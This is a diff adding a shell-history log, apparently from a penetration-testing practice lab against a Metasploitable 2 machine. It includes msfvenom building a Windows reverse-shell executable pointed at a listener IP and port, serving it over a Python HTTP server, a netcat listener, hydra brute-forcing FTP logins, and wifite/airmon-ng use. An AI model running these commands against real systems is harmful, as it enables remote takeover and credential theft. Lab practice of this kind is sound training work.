@@ -1,0 +1,95 @@
+ 1920  reboot
+ 1921  ping 192.168.145.28
+ 1922  msfvenom 
+ 1923  msfvenom -p windows/x86/shell_reverse_tcp -o abc.exe 
+ 1924  msfvenom --list payloads| grep windows/x64/shell
+ 1925  msfvenom --list payloads| grep windows/x64/shell_reverse_tcp
+ 1926  msfvenom --list 
+ 1927  msfvenom --list  encoders
+ 1928  msfvenom --list  
+ 1929  msfvenom --list  platfforms
+ 1930  msfvenom --list  platforms
+ 1931  msfvenom -p windows/x64/shell_reverse_tcp --platforms windows -o abc.exe 
+ 1932  msfvenom -p windows/x64/shell_reverse_tcp --platform windows -o abc.exe 
+ 1933  ls abc.exe 
+ 1934  python3 -m http.server
+ 1935  msfvenom -p windows/x64/shell_reverse_tcp --platform windows LHOST=192.168.145.58 LPORT=4444  -o abc.exe 
+ 1936  python3 -m http.server
+ 1937  ifconfig
+ 1938  ifconfig | grep ient
+ 1939  ifconfig | grep iner
+ 1940  ifconfig | grep inet
+ 1941  rm -rf abc.exe 
+ 1942  nc -lvp 4444
+ 1943  htop
+ 1944  cd Desl
+ 1945  cd Desktop/
+ 1946  ls
+ 1947  touch test
+ 1948  nano test 
+ 1949  cat test 
+ 1950  nano test 
+ 1951  sudo nano  /etc/apt/sources.list
+ 1952  cat /etc/apt/sources.list
+ 1953  /bin/bash
+ 1954  sudo nano  /etc/apt/sources.list
+ 1955  cat  /etc/apt/sources.list
+ 1956  hydra
+ 1957  ftp 192.168.56.103
+ 1958  apt-cache search ftp
+ 1959  sudo apt isntall ftp
+ 1960  sudo apt install ftp
+ 1961  ftp 192.168.56.103
+ 1962  sudo apt install xhydra
+ 1963  apt-cache searh xhydra
+ 1964  apt-cache search xhydra
+ 1965  hexchat 
+ 1966  hydra -h
+ 1967  cd Desktop/ms2-hack/
+ 1968  ls
+ 1969  htop
+ 1970  ll
+ 1971  cat newWordlist.txt | grep msfadmi > 000.txt
+ 1972  ls
+ 1973  ll
+ 1974  wc 000.txt 
+ 1975  wc -l 000.txt 
+ 1976  cat 000.txt 
+ 1977  ll
+ 1978  cat nmap_ms2.txt 
+ 1979  ls
+ 1980  ll
+ 1981  cat wordlist.txt | grep msfad >> newWordlist.txt
+ 1982  ls
+ 1983  ll
+ 1984  wc newWordlist.txt 
+ 1985  cat newWordlist.txt 
+ 1986  wc -l newWordlist.txt 
+ 1987  cat commands.txt 
+ 1988  hydra -L newWordlist.txt  -P newWordlist.txt -V -o result.txt ftp://192.168.56.103
+ 1989  hydra -L 000.txt  -P 000.txt -V -o result.txt ftp://192.168.56.103
+ 1990  ll
+ 1991  cat result.txt 
+ 1992  cat nmap_ms2.txt 
+ 1993  msfconsole
+ 1994  ifconfig | grep inet
+ 1995  hexchat 
+ 1996  sudo wifite
+ 1997  sudo airmon-ng 
+ 1998  htop
+ 1999  cd DEsk
+ 2000  cd Desktop/
+ 2001  cd ms2-hack/
+ 2002  ll
+ 2003  histoty
+ 2004  history 
+ 2005  python -c "print(2004-1920)"
+ 2006  tail -84 history 
+ 2007  history | tail 84
+ 2008  tail h
+ 2009  tail -h
+ 2010  tail --help
+ 2011  history | tail  -n 84
+ 2012  history | tail  -n 90
+ 2013  history | tail  -n 100 |less
+ 2014  history | tail  -n 100 |less > history.txt
